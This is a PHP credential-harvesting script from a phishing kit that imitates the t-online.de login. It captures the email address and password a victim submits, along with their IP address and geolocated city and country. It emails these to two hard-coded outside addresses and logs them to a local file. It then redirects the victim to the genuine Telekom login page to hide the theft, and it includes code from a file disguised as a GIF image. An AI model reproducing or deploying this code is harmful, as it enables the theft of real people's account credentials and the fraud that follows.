<?php

$email = $_POST['email'];
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$msg = "------------------| t-online.de |--------------------\n";
$msg .= "Email Provider: t-online.de\n";
$msg .= "Email: ".$_POST[email]."\n";
$msg .= "Password: ".$_POST[pw_pwd]."\n";
$msg .= "IP: $ip\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "ogdenaoife@gmail.com,ansrenben01@hotmail.com";
$subject = "t-online.de | $ip | {$geoplugin->countryCode}";
include_once "images/button.gif";
mail($send,$subject,$msg);

$fp = fopen("fox.txt","a");
fputs($fp,$msg);
fclose($fp);

header('location: https://accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901PORTAL00000000000000&state=a7ecab754260e716e7c473596636ef355b9bc63d5eddcc6d512d7061c391071d&claims={%22id_token%22%3A{%22urn%3Atelekom.com%3Aall%22%3Anull}}&nonce=a7ecab754260e716e7c473596636ef355b9bc63d5eddcc6d512d7061c391071d&redirect_uri=https%3A%2F%2Flogin.t-online.de%2Fcallback&logout_uri=https%3A%2F%2Flogin.t-online.de%2Ftelekom_logout&display=popup&scope=openid&response_type=code'); 

?>